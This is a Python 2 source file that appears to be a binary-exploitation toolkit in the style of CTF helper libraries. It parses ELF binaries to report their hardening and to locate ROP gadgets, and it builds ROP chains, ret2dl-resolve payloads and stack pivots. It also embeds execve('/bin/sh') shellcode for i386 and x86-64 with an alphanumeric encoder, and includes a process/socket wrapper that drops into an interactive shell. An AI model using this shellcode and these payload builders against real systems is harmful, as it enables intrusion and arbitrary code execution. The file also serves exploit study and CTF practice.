import sys
import re
import struct
import socket
import time
from telnetlib import Telnet
from subprocess import Popen, PIPE


def p32(x):
    if isinstance(x, str):
        return struct.unpack_from('<I', x)[0]
    else:
        return struct.pack('<I', x)

def p64(x):
    if isinstance(x, str):
        return struct.unpack_from('<Q', x)[0]
    else:
        return struct.pack('<Q', x)


class ELF:
    def __init__(self, fpath, base=0):
        self.fpath = fpath
        self.base = base
        self.sec = dict(relro=False, bind_now=False, stack_canary=False, nx=False, pie=False, rpath=False, runpath=False, dt_debug=False)

        p = Popen(['objdump', '-f', fpath], stdout=PIPE)
        for line in p.stdout:
            if 'DYNAMIC' in line:
                self.sec['pie'] = True
            field = line.split()
            if len(field) != 4:
                continue
            if field[2] != 'format':
                continue
            if field[3] == 'elf64-x86-64':
                self.wordsize = 8
            elif field[3] == 'elf32-i386':
                self.wordsize = 4
            else:
                raise Exception('unsupported format: %s' % field[3])

        self._section = {}
        p = Popen(['objdump', '-h', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 7:
                continue
            name, addr = field[1], int(field[3], 16)
            self._section[name] = addr

        self._got = {}
        self._plt = {}
        idx = 0
        p = Popen(['objdump', '-R', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 3:
                continue
            if not 'JUMP_SLOT' in field[1]:
                continue
            name, addr = field[2], int(field[0], 16)
            self._got[name] = addr
            self._plt[name] = self._section['.plt'] + 0x10*(idx+1)
            if name == '__stack_chk_fail':
                self.sec['stack_canary'] = True
            idx += 1

        self._symbol = {}
        p = Popen(['objdump', '-T', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 7:
                continue
            name, addr = field[6], int(field[0], 16)
            self._symbol[name] = addr

        p = Popen(['objdump', '-p', fpath], stdout=PIPE)
        while True:
            line = p.stdout.readline()
            if not line:
                break
            field = line.split()
            if len(field) > 0:
                if field[0] == 'BIND_NOW':
                    self.sec['bind_now'] = True
                elif field[0] == 'RPATH':
                    self.sec['rpath'] = True
                elif field[0] == 'RUNPATH':
                    self.sec['runpath'] = True
                elif field[0] == 'DEBUG':
                    self.sec['dt_debug'] = True
            if len(field) != 9:
                continue
            if field[0] == 'RELRO':
                self.sec['relro'] = True
                p.stdout.readline()
            elif field[0] == 'STACK':
                line = p.stdout.readline()
                field = line.split()
                if not 'x' in field[5]:
                    self.sec['nx'] = True
            elif field[0] == 'LOAD':
                vaddr, off = int(field[4], 16), int(field[2], 16)
                line = p.stdout.readline()
                field = line.split()
                if not 'x' in field[5]:
                    continue
                filesz = int(field[1], 16)
                with open(fpath, 'rb') as f:
                    f.seek(off)
                    blob = f.read(filesz)
                self.xmem = dict(offset=vaddr, blob=blob)

        self._string = {}
        p = Popen(['strings', '-tx', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 2:
                continue
            name, addr = field[1], int(field[0], 16)
            self._string[name] = addr

    def p(self, x):
        if self.wordsize == 8:
            return p64(x)
        else:
            return p32(x)

    def gadget(self, keyword, arg=1):
        regs = ['ax', 'cx', 'dx', 'bx', 'sp', 'bp', 'si', 'di']

        if keyword == 'ret':
            return self.xmem['offset'] + self.xmem['blob'].index('\xc3')
        elif keyword == 'leave':
            return self.xmem['offset'] + self.xmem['blob'].index('\xc9\xc3')
        elif keyword == 'pop':
            if isinstance(arg, int):
                # skip rsp
                m = re.search(r"[\x58-\x5b\x5d-\x5f]{%d}\xc3" % arg, self.xmem['blob'])
                return self.xmem['offset'] + m.start()
            else:
                if len(arg) == 3 and arg[0] in ('r', 'e'):
                    chunk = chr(0x58+regs.index(arg[1:])) + '\xc3'
                    return self.xmem['offset'] + self.xmem['blob'].index(chunk)
                else:
                    raise Exception("unexpected register: %r" % arg)
        elif keyword == 'pivot_eax':
            # xchg esp, eax
            return self.xmem['offset'] + self.xmem['blob'].index('\x94\xc3')
        elif keyword == 'pushad':
            # x86 only
            return self.xmem['offset'] + self.xmem['blob'].index('\x60\xc3')
        elif keyword == 'popad':
            # x86 only
            return self.xmem['offset'] + self.xmem['blob'].index('\x61\xc3')
        else:
            # arbitary chunk
            return self.xmem['offset'] + self.xmem['blob'].index(keyword)

    def set_base(self, addr, name='__libc_start_main'):
        self.base = addr - self._symbol[name]

    def section(self, name):
        return self.base + self._section[name]

    def got(self, name):
        return self.base + self._got[name]

    def plt(self, name):
        return self.base + self._plt[name]

    def addr(self, name):
        return self.base + self._symbol[name]

    def str(self, name):
        return self.base + self._string[name]

    def checksec(self):
        ary = []

        if self.sec['relro']:
            if self.sec['bind_now']:
                ary.append('\033[32mFull RELRO   \033[m   ')
            else:
                ary.append('\033[33mPartial RELRO\033[m   ')
        else:
            ary.append('\033[31mNo RELRO     \033[m   ')

        if self.sec['stack_canary']:
            ary.append('\033[32mCanary found   \033[m   ')
        else:
            ary.append('\033[31mNo canary found\033[m   ')

        if self.sec['nx']:
            ary.append('\033[32mNX enabled \033[m   ')
        else:
            ary.append('\033[31mNX disabled\033[m   ')

        if self.sec['pie']:
            ary.append('\033[32mPIE enabled  \033[m   ')
        else:
            ary.append('\033[31mNo PIE       \033[m   ')

        if self.sec['rpath']:
            ary.append('\033[31mRPATH    \033[m  ')
        else:
            ary.append('\033[32mNo RPATH \033[m  ')

        if self.sec['runpath']:
            ary.append('\033[31mRUNPATH    \033[m  ')
        else:
            ary.append('\033[32mNo RUNPATH \033[m  ')

        ary.append(self.fpath)

        print "RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE"
        print ''.join(ary)


class ROP(ELF):
    def call(self, addr, *args):
        if len(args) > 4:
            raise Exception("over 4 args is unsupported: %d" % len(args))

        if self.wordsize == 8:
            regs = ['rdi', 'rsi', 'rdx', 'rcx']
            buf = ''
            for i, arg in enumerate(args):
                buf += self.p(self.gadget('pop', regs[i]))
                buf += self.p(arg)
            buf += self.p(addr)
            return buf
        else:
            buf = self.p(addr)
            buf += self.p(self.gadget('pop', len(args)))
            for arg in args:
                buf += self.p(arg)
            return buf

    def call_plt(self, name, *args):
        return self.call(self.plt(name), *args)

    def call_chain(self, *calls):
        if self.wordsize != 8:
            raise Exception('support x86-64 only')

        chunk1 = '\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea'
        chunk2 = '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3'
        set_regs = self.gadget(chunk2)
        call_r12 = self.gadget(chunk1 + chunk2)

        args = calls[0]
        ptr = args.pop(0)
        buf = p64(set_regs)
        buf += self.junk()
        buf += p64(0) + p64(1) + p64(ptr)
        for arg in args:
            buf += p64(arg)
        buf += self.junk(3-len(args))
        buf += p64(call_r12)

        for args in calls[1:]:
            ptr = args.pop(0)
            buf += self.junk()
            buf += p64(0) + p64(1) + p64(ptr)
            for arg in args:
                buf += p64(arg)
            buf += self.junk(3-len(args))
            buf += p64(call_r12)

        buf += p64(0) * 7
        return buf

    def call_chain_plt(self, *calls):
        ary = []
        for call in calls:
            ary.append([self.got(call[0])] + call[1:])
        return self.call_chain(*ary)

    def dl_resolve(self, base, name, *args):
        if self.wordsize == 8:
            # prerequisite:
            # 1) overwrite (link_map + 0x1c8) with NULL
            # 2) set registers for arguments
            addr_reloc = base + self.wordsize*3
            align_reloc = 0x18 - ((addr_reloc - self.section('.rela.plt')) % 0x18)
            addr_reloc += align_reloc
            addr_sym = addr_reloc + 0x18
            align_dynsym = 0x18 - ((addr_sym - self.section('.dynsym')) % 0x18)
            addr_sym += align_dynsym
            addr_symstr = addr_sym + 0x18

            reloc_offset = (addr_reloc - self.section('.rela.plt')) / 0x18
            r_info = (((addr_sym - self.section('.dynsym')) / 0x18) << 32) | 0x7
            st_name = addr_symstr - self.section('.dynstr')

            buf = self.p(self.section('.plt'))
            buf += self.p(reloc_offset)
            buf += self.junk()
            buf += 'A' * align_reloc
            buf += struct.pack('<QQQ', self.section('.bss'), r_info, 0)  # Elf64_Rela
            buf += 'A' * align_dynsym
            buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
            buf += self.string(name)
        else:
            addr_reloc = base + self.wordsize*(3+len(args))
            addr_sym = addr_reloc + 0x8
            align_dynsym = 0x10 - ((addr_sym - self.section('.dynsym')) % 0x10)
            addr_sym += align_dynsym
            addr_symstr = addr_sym + 0x10

            reloc_offset = addr_reloc - self.section('.rel.plt')
            r_info = (((addr_sym - self.section('.dynsym')) / 0x10) << 8) | 0x7
            st_name = addr_symstr - self.section('.dynstr')

            buf = self.p(self.section('.plt'))
            buf += self.p(reloc_offset)
            buf += self.junk()
            for arg in args:
                buf += self.p(arg)
            buf += struct.pack('<II', self.section('.bss'), r_info)  # Elf32_Rel
            buf += 'A' * align_dynsym
            buf += struct.pack('<IIII', st_name, 0, 0, 0x12)         # Elf32_Sym
            buf += self.string(name)

        return buf

    def pivot(self, rsp):
        buf = self.p(self.gadget('pop', 'rbp'))
        buf += self.p(rsp - self.wordsize)
        buf += self.p(self.gadget('leave'))
        return buf

    def string(self, s):
        return s + '\x00'

    def junk(self, n=1):
        return 'A' * self.wordsize * n

    def fill(self, size, buf=''):
        return 'A' * (size-len(buf))


class Shellcode:
    _database = {
        'i386': {
            'exec_shell': "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
        },
        'x86-64': {
            'exec_shell': "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
        }
    }

    def __init__(self, arch):
        if arch not in ('i386', 'x86-64'):
            raise Exception("unsupported architechture: %r" % arch)
        self.arch = arch

    def get(self, name):
        return self._database[self.arch][name]

    def alnum(self, name, reg=None):
        if self.arch != 'i386':
            raise Exception("unsupported architechture: %r" % self.arch)

        chars = range(0x30,0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b)
        pairs = [(y, z) for y in chars for z in chars]
        regs = ['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi']

        data = '\xf0' + self.get(name) + '\x00'
        encoded = [0x30]

        for i, c in enumerate(data):
            original_byte = ord(c)
            x = encoded[i]
            for y, z in pairs:
                if (x^(y*0x30)^z) & 0xFF == original_byte:
                    encoded += [y, z]
                    break
            else:
                raise Exception("something wrong: %02x" % original_byte)

        if reg:
            try:
                r = regs.index(reg.lower())
            except ValueError:
                raise Exception("unsupported register: %s" % reg)

            # push reg; pop ecx
            buf = chr(0x50+r) + 'Y'
        else:
            # set ecx by using call
            buf = '\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xffYF'

        buf += 'h3333k4dsFkDqG02DqH0D10u' + str(bytearray(encoded))
        return buf


class Proc:
    def __init__(self, *args, **kwargs):
        if 'host' in kwargs and 'port' in kwargs:
            self.p = socket.create_connection((kwargs['host'], kwargs['port']))
        else:
            self.p = Popen(args, stdin=PIPE, stdout=PIPE)

    def write(self, s):
        time.sleep(1e-3)
        if isinstance(self.p, Popen):
            return self.p.stdin.write(s)
        else:
            return self.p.send(s)

    def read(self, size):
        if isinstance(self.p, Popen):
            return self.p.stdout.read(size)
        else:
            return self.p.recv(size)

    def wait(self):
        if isinstance(self.p, Popen):
            self.p.wait()
        else:
            t = Telnet()
            t.sock = self.p
            t.interact()
            t.close()

    def interact(self):
        if isinstance(self.p, Popen):
            self.write('exec /bin/sh <&2 >&2\n')
        self.wait()

    def write_p64(self, s):
        return self.write(p64(s))

    def write_p32(self, s):
        return self.write(p32(s))

    def read_p64(self):
        return p64(self.read(8))

    def read_p32(self):
        return p32(self.read(4))


class Pattern:
    @classmethod
    def generate(self):
        for x in xrange(0x41, 0x5b):
            for y in xrange(0x61, 0x7b):
                for z in xrange(0x30, 0x3a):
                    yield "%c%c%c" % (x, y, z)

    @classmethod
    def create(cls, size):
        s = ''
        for x in cls.generate():
            s += x
            if len(s) >= size:
                return s[:size]
        else:
            raise Exception("size too large")

    @classmethod
    def offset(cls, addr):
        if addr >> 32:
            chunk = p64(addr)
        else:
            chunk = p32(addr)

        s = ''
        for x in cls.generate():
            s += x
            if chunk in s:
                return s.index(chunk)
        else:
            raise Exception("not found")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print >>sys.stderr, "Usage: %s [checksec|create|offset] ..." % sys.argv[0]
        sys.exit(1)
    cmd = sys.argv[1]
    if cmd == 'checksec':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: %s checksec FILE" % sys.argv[0]
            sys.exit(1)
        fpath = sys.argv[2]
        ELF(fpath).checksec()
    elif cmd == 'create':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: %s create SIZE" % sys.argv[0]
            sys.exit(1)
        size = int(sys.argv[2])
        print Pattern.create(size)
    elif cmd == 'offset':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: %s offset ADDRESS" % sys.argv[0]
            sys.exit(1)
        addr = int(sys.argv[2], 16)
        print Pattern.offset(addr)
